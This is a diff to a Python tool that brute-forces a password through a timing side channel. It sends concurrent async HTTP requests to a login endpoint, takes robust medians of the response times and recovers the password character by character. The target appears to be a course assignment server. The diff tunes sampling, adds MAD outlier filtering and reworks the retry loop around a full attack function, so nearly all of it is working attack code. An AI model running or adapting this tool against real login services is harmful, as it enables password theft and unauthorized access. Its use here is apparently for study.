@@ -27,7 +27,7 @@ class Logger:
             print(msg)
 
 
-logger = Logger(enabled=False)
+logger = Logger(enabled=True)
 
 class MeasuresCollector:
     def __init__(self):
@@ -63,7 +63,7 @@ class MeasuresCollector:
 
 def robust_median(
     samples: List[int],
-    min_samples_for_filtering: int = 7,
+    min_samples_for_filtering: int = 5,
     mad_threshold: float = 3.5
 ) -> float:
     if not samples:
@@ -145,7 +145,7 @@ class AsyncHTTPSender(RequestSender):
         url: str,
         base_payload: Dict[str, Any],
         timeout_sec: float = 5.0,
-        pool_size: int = 100 # שוּנה: הגדלת בריכת החיבורים ל-100
+        pool_size: int = 100
     ):
         self.url = url.rstrip("/") + "/"
         self.fixed_payload = base_payload.copy()
@@ -156,14 +156,12 @@ class AsyncHTTPSender(RequestSender):
     async def _setup_session(self) -> None:
         """Create and configure a requests Session with connection pooling."""
         timeout = aiohttp.ClientTimeout(total=self.timeout_sec)
-        # שימוש ב-TCPConnector עם מגבלת חיבורים גבוהה
         connector = aiohttp.TCPConnector(limit=self.pool_size, ssl=False) 
         self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
 
 
     async def _do_initial_warmup(self) -> None:
         """Perform a few dummy requests to warm up connection pool"""
-        # הרצת Warmup במקביל
         tasks = []
         for i in range(3):
             payload = {"password": f"warm{i}"}
@@ -203,7 +201,6 @@ class AsyncHTTPSender(RequestSender):
             return body_txt, int(elapsed_us)
             
         except Exception:
-            # במקרה של שגיאה (Timeout או אחרת), מחזיר 0 שמהווה outlier ויוסר בדרך כלל
             return "", 0
 
     async def close_sessions(self):
@@ -229,7 +226,6 @@ class AsyncSampler:
         if isinstance(self.sender, AsyncHTTPSender) and self.sender.session is None:
             await self.sender.init()
 
-        # הדגימות רצות במקביל! (כבר היה בקוד המקורי - נשמר)
         tasks = [self.sender.send(payload) for _ in range(n_samples)]
         results = await asyncio.gather(*tasks, return_exceptions=False)
 
@@ -245,7 +241,7 @@ class MedianDecisionEngine(DecisionEngine):
     def __init__(
         self,
         min_samples: int = 2,
-        min_samples_for_filtering: int = 7,
+        min_samples_for_filtering: int = 5,
         mad_threshold: float = 3.5,
     ):
         self.min_samples = min_samples
@@ -374,7 +370,7 @@ class TimingAttacker:
         Returns:
             Tuple of (gap_in_us, best_character).
         """
-        medians = {c: statistics.median(arr) for c, arr in samples.items() if arr}
+        medians = {char: robust_median(char_measures) for char, char_measures in samples.items() if char_measures}
 
         if not medians:
             return 0, "a"
@@ -461,7 +457,7 @@ class TimingAttacker:
         password_len: int,
         top_k: int = 3,
         max_rounds: int = 3,
-        sample_increment: int = 1,
+        sample_increment: int = 2,
         max_samples: int = 10,
         initial_samples: int = 3,
         min_gap_microseconds: int = 200
@@ -505,6 +501,13 @@ class TimingAttacker:
 
         return password, status
     
+    async def close(self, clear_measures: bool = False):
+        if clear_measures and self.measures_memory:
+            self.measures_memory.clear()
+        
+        if self.sampler.sender:
+            await self.sampler.sender.close_sessions()
+    
 
 # ==========================
 # Main
@@ -531,26 +534,28 @@ async def commit_full_attack(username: str, victim: VictimServer, difficulty: in
         base_payload=base_payload,
         decision_engine=median_decision_engine
     )
-    attack_params = calibrate_attack_params(difficulty=difficulty)
+    # attack_params = calibrate_attack_params(difficulty=difficulty)
 
-    try:
-        attack_status = "0"
-        retries = 0
-
-        while (attack_status != "1") and retries < retries_on_fail:
-            retries += 1
-
-            password_length = await attacker.detect_password_length(samples_for_pwd_len=max(4, difficulty))
-            print(f"difficulty ({difficulty}) || pwd len detected is [ {password_length} ]")
-            password, attack_status = await attacker.attack(password_len=password_length) #, **attack_params TODO:)
-            print(f"    retries ({retries}) || attack_status [ {attack_status} ]")
-            await async_http_sender.close_sessions()
+    for attempt in range(1, retries_on_fail + 1):
+        logger.log(f"Difficulty ({difficulty}) attempt {attempt}")
+        try:
+            password_length = await attacker.detect_password_length(
+                samples_for_pwd_len=max(4, difficulty)
+            ) # TODO: pass the parameter like humen.. its barbaric
+            logger.log(f"    password length = {password_length}")
+            password, attack_status = await attacker.attack(password_len=password_length) # TODO: Calibrate attack params adaptive to difficulty
+            logger.log(f"    attack status: {attack_status} || password detected = {password}")
+            
+            if attack_status == "1":
+                return password
         
-        return password
-    
-    except Exception as e:
-        await async_http_sender.close_sessions()
-        raise Exception(e)
+        except Exception as e:
+            logger.log(f"Error: attempt {attempt} failed: {e}")
+
+        finally:
+            await attacker.close(clear_measures=attack_status == "1") # clear measures memory if attack succeed
+            await asyncio.sleep(0.1)
+
 
 async def main():
     BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
